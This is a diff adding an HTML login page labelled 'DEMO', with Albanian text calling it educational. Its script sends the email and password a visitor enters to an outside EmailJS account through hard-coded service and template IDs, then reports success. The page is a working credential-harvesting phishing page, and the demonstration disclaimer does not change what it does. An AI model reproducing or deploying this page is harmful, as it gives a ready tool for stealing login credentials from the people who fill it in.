@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="sq">
+<head>
+<meta charset="UTF-8">
+<title>Login Demo</title>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+body {
+  font-family: Arial, system-ui;
+  background:#020617;
+  color:white;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+.box {
+  background:#020617;
+  border:1px solid #1e293b;
+  padding:25px;
+  border-radius:10px;
+  width:320px;
+}
+input, button {
+  width:100%;
+  padding:10px;
+  margin-top:10px;
+}
+button {
+  background:#38bdf8;
+  border:none;
+  cursor:pointer;
+  font-weight:bold;
+}
+small {
+  color:#94a3b8;
+}
+#msg {
+  margin-top:10px;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Login (DEMO)</h2>
+
+  <input type="email" id="email" placeholder="Email" required>
+  <input type="password" id="password" placeholder="Password" required>
+
+  <button onclick="sendData()">Login</button>
+
+  <small>
+    Kjo faqe është vetëm për demonstrim mësimor.<br>
+    Të dhënat dërgohen për qëllime edukative.
+  </small>
+
+  <div id="msg"></div>
+</div>
+
+<script>
+(function(){
+  emailjs.init("yCJFf8xG8mMT52UaU"); // PUBLIC KEY
+})();
+
+function sendData() {
+  let params = {
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value
+  };
+
+  emailjs.send(
+    "service_arp1qve",   // SERVICE ID
+    "template_90jbw6r",  // TEMPLATE ID
+    params
+  )
+  .then(function() {
+    document.getElementById("msg").innerHTML =
+      "✅ Të dhënat u dërguan me sukses (DEMO).";
+  }, function(error) {
+    document.getElementById("msg").innerHTML =
+      "❌ Gabim gjatë dërgimit.";
+    console.log(error);
+  });
+}
+</script>
+
+</body>
+</html>
